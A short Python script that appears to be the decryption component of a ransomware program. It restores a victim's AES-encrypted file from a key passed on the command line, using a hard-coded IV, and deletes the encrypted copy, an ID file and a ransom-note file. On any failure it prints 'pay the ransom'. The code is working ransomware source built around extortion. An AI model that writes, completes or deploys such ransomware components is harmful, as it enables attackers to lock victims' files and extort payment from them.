import subprocess
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP\

# get private key from file
with open('d.key', 'rb') as f:
    private_key = RSA.import_key(f.read())

# use standard iv from before
iv = b'0123456789ABCDEF'

file_name = sys.argv[1]
file_name = file_name[:-10] #save file name without .encrypted

with open(f'{file_name}.ID', 'rb') as f:
    encrypted_data = f.read()

binary_string = sys.argv[2]

try:
    key = bytes.fromhex(binary_string)# convert string back to binary
    ciphertext = encrypted_data[private_key.size_in_bytes():] #get ciphertext
    cipher = AES.new(key, AES.MODE_CBC, iv) #generate key
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) #unpad and decrypt
    with open(f'{file_name}', 'wb') as f:
        f.write(plaintext)
        print('file restored') #if all passes before restore the file
    os.remove(f'{file_name}.encrypted')
    os.remove(f'{file_name}.ID')
    os.remove(f'{file_name}.note')
except:
    print('pay the ransom') #prints if anything fails

#note that this file does not contain any information about the old key (so this file can be given when the file is corrupted)